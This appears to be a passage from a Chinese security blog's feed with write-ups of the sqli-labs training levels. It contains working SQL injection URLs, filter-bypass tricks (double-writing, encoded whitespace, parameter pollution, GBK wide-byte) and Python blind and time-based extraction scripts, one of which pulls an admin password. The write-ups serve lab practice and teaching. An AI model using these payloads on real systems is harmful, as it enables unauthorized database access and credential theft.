class="line">http://192.168.100.105/sqlilabs/Less-46/?sort=rand(updatexml(1,concat(0x7e,database(),0x7e),1))</span><br></pre></td></tr></table></figure><p>也可以用盲注，利用表格最后一行去区分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-46/?sort=rand(ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125;)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Min+Max)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;td&gt;superman&lt;/td&gt;&lt;td&gt;genious&lt;/td&gt;&lt;/tr&gt;&lt;/font&gt;&lt;/table&gt;'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>这一次的order by注入需要闭合单引号<br>来个报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-47/?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>跟46题一样的盲注。</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>一直在尝试下面这两句话，发现一直没效果，奇了怪，自我感觉没问题。。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and rand(ascii(substr((select database()),1,1))&gt;127)%23</span><br><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and ascii(substr((select database()),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>再来尝试一下时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-49/?sort=1' and if(((ascii(substr((select password from users where username="admin"),&#123;_&#125;,1)))=&#123;__&#125;),sleep(4),false) --+'''</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">67</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>直接出来结果，这尼玛什么操作。。</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>这可以直接报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-50?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>单引号闭合报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-51?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>同样直接盲注或者时间盲注都行，不需要单引号闭合没什么意义</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>又是一道单引号闭合的题目，直接时间盲注就可以出来参考Less-49的脚本</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这一部分的题目让我了解到怎么对付order by注入，很有意义，个人最喜欢还是用rand函数的那种办法<br>但前面的堆叠注入就感觉意义不大。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-38&quot;&gt;&lt;a href=&quot;#Less-38&quot; class=&quot;headerlink&quot; title=&quot;Less-38&quot;&gt;&lt;/a&gt;Less-38&lt;/h3&gt;&lt;p&gt;从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(二)</title>
    <link href="0verwatch.top/sqli-labs-training-2.html"/>
    <id>0verwatch.top/sqli-labs-training-2.html</id>
    <published>2018-08-29T12:01:26.000Z</published>
    <updated>2018-08-29T12:15:57.643Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了<a id="more"></a><br>这一题查看源代码的话发现注释符被过滤掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>但其实对于这一句SQL语句，我们可以直接单引号闭合而不用注释去把后面的东西给省略掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-23/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>直接报出数据库，此题完结</p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这一题应该是设计二次注入的题目<br>在CTF题目里面的话肯定是要你获取admin的账号然后改变admin的密码用admin账号登录获取flag<br>这里主要关键是pass_change.php这里面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span></span><br></pre></td></tr></table></figure><p>若我们在修改密码的时候<br>注册一个<code>admin’#</code>的用户就是为了后期能够使这一句话后面的内容全都注释的，从而直接更新的是<code>admin</code>的用户名<br>这时候的语句就会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">'$pass'</span> where username=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure><p>改你想要密码，然后退出在直接用admin登录就好</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>这一题看源代码会发现有一个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把or还有AND都会替换成为<code>&quot;&quot;</code>，这里是大小写都会被拦截下来的<br>这时候其实可以有几个办法能够绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）大小写变形Or,OR,oR</span><br><span class="line">（2）编码，hex，urlencode</span><br><span class="line">（3）添加注释/*or*/</span><br><span class="line">（4）利用符号and=&amp;&amp; or=||</span><br><span class="line">（5）双写绕过</span><br></pre></td></tr></table></figure><p>输入一个单引号会出现单引号的报错，所以我们尝试闭合一下<br><code>http://127.0.0.1/sqlilabs/Less-25/?id=1%27 %23</code> 成功出现回显 </p><p>我这里选择用双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; aandnd updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>符号绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; || updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>跟上面一题同样的过滤方式，语句变简单了，不用单引号去闭合<br>但是这一题不能再用报错注入，因为源码中把报错信息给注释掉了，可以用盲注，我们需要用的是union注入或者是盲注<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>再来一个二分法盲注，通过注入成功还会显示登录名这个标志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-25a/?id=1 aandnd ascii(substr(database(),&#123;_&#125;,1))&gt;&#123;__&#125;%23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p>注意 上面这两关在写到关于information这个单词的时候，需要注意它里面存在or，我们需要双写绕过</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>输入?id=’会出现单引号的报错<br>但是想用注释符去闭合发现没效果，再用<code>?id=1&#39; or &#39;1&#39;=&#39;1</code>去尝试发现回显成功，这有可能就是注释符被过滤了<br>看看源代码，果然黑名单被过滤了，空格也被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没关系，这样我们也可以使用报错注入，这里空格要想绕过的话不能够用注释了，我们可以用<code>%a0</code>，但是我们也可以用无空格报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&apos; ||updatexml(1,concat(0x7e,database(),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>用%a0也可以注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-26/?id=1&apos;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.TABLES</span><br><span class="line">%a0where%a0TABLE_SCHEMA=database()),0x7e),1)%a0anandd%0a&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>此处我们需要说明两方面：对于<code>注释</code>和结尾字符的我们此处只能利用<br>构造一个<code>’</code> 来闭合后面到<code>’</code> ；<br>对于空格，有较多的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure></p><p>注意上面的编码绕不过的话我们可以用Linux环境测试</p><p>Less-26a<br>只是查询的句子变了，多了一个括号，这一题也不能报错<br>我们可以用盲注<br><a href="http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr</a>(‘1’=’1</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>这里发现源代码里面的黑名单又壮大了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们任然可以用双写绕过，也可以用大小写绕过，但是我们直接报错注入就行了不用麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-27/?id=1&apos;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>这一题就是源代码把报错注入的回显给注释掉<br>那我们用盲注就好<br>双引号闭合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-27a/?id=1"and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;"&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>这一题把<code>union select</code>无论大小写都过滤掉了，把上面那几题能够双写绕过的全都封杀掉了<br>这一题只能够盲注，不能报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-28/?id=1')and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;('&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>这一题跟上面一题区别不大，也是用盲注，也可以用<code>union注入</code>，只是不要出现+号就好<br>忙著自己闭合单引号和括号就行<br>这里我用的是union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-28a/?id=-1%27)unIon(SeLect%201,database(),%273</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>这一题好像是涉及到二层服务的问题，里面的有一个叫HPP(http参数污染)攻击<br>但是没关系就是第一个参数通过了第一层服务器的waf过滤结果第二个参数没有过滤，这是因为apache的特性，只获取最后一个参数<br>这里我们是可以直接用单引号闭合就ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-29/?id=1&amp;id=-1%27%20union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>同上面的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br></pre></td></tr></table></figure><p>就是先利用了这个Tomcat去做waf过滤，其实对第二个参数不起作用<br>这次直接闭合双引号就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-30/?id=1&amp;id=-1&quot; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>Less-31<br>这一题就是SQL查询语句变了一下，我们需要闭合双引号和括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-31/?id=1&amp;id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>这一题我一开始没有头绪，因为所有参数都被转义了，不能够闭合，后来发现是另外的绕过方法，原来是宽字节的问题<br>原理：mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如<code>%aa%5c</code> 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤<code>’</code> 的时候，往往利用的思路是将<code>‘</code> 转换为<code>\’</code><br>因此我们在此想办法将‘ 前面添加的\ 除掉，一般有两种思路：</p><ol><li><code>%df</code> 吃掉<code>\</code> 具体的原因是urlencode(\‘) = <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的时候会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li><li>将<code>\’</code> 中的<code>\</code> 过滤掉，例如可以构造<code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的<code>%5c</code>给注释掉。这也是bypass 的一种方法。</li></ol><p>看源代码我们利用单引号闭合然后加上%df就好，这里我们可以用union注入也可以用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-32/?id=-1%df%27union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>这个同上面那题一模一样直接闭合单引号就好，是就是上面写的check函数应该是作者自己写的，这一题是直接调用了系统的函数<br>对比一下两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 